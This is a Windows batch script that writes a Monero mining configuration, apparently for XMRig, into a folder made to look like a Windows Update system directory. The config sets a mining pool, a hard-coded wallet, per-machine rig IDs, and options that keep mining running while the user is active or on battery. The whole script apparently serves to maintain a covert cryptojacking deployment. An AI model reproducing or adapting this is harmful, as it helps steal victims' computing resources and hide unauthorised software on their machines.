@echo off
title FIX DEPLOYED CONFIG
color 0A

echo ================================================================
echo  FIX DEPLOYED CONFIGURATION
echo  Creating simple working config (like BEAST_MODE)
echo ================================================================
echo.

set LOC="C:\ProgramData\Microsoft\Windows\WindowsUpdate"

if not exist %LOC% (
    echo [ERROR] Deployment location not found!
    pause
    exit
)

echo Creating BEAST_MODE compatible config...

REM Create exact same config as working BEAST_MODE
(
echo {
echo   "api": {"id": null, "worker-id": "%COMPUTERNAME%"},
echo   "http": {"enabled": true, "host": "127.0.0.1", "port": 16000, "restricted": true},
echo   "autosave": true,
echo   "background": false,
echo   "colors": false,
echo   "title": false,
echo   "randomx": {
echo     "init": -1,
echo     "init-avx2": -1,
echo     "mode": "auto",
echo     "1gb-pages": false,
echo     "rdmsr": true,
echo     "wrmsr": true,
echo     "cache_qos": true,
echo     "numa": true,
echo     "scratchpad_prefetch_mode": 1
echo   },
echo   "cpu": {
echo     "enabled": true,
echo     "huge-pages": false,
echo     "huge-pages-jit": false,
echo     "hw-aes": null,
echo     "priority": 2,
echo     "memory-pool": true,
echo     "yield": true,
echo     "max-threads-hint": 50,
echo     "asm": true,
echo     "argon2-impl": null,
echo     "astrobwt-max-size": 550,
echo     "astrobwt-avx2": false
echo   },
echo   "donate-level": 0,
echo   "pools": [{
echo     "algo": "rx/0",
echo     "coin": "monero",
echo     "url": "gulf.moneroocean.stream:10128",
echo     "user": "49MJ7AMP3xbB4U2V4QVBFDCJyVDnDjouyV5WwSMVqxQo7L2o9FYtTiD2ALwbK2BNnhFw8rxHZUgH23WkDXBgKyLYC61SAon",
echo     "pass": "%COMPUTERNAME%-i5",
echo     "rig-id": "%COMPUTERNAME%",
echo     "keepalive": true,
echo     "enabled": true,
echo     "tls": false,
echo     "daemon": false
echo   }],
echo   "print-time": 0,
echo   "health-print-time": 0,
echo   "pause-on-battery": false,
echo   "pause-on-active": false
echo }
) > %LOC%\config.json

echo [OK] Config updated with BEAST_MODE settings!
echo.
echo Now try running: TEST_DEPLOYED_CONFIG.bat
echo.
pause
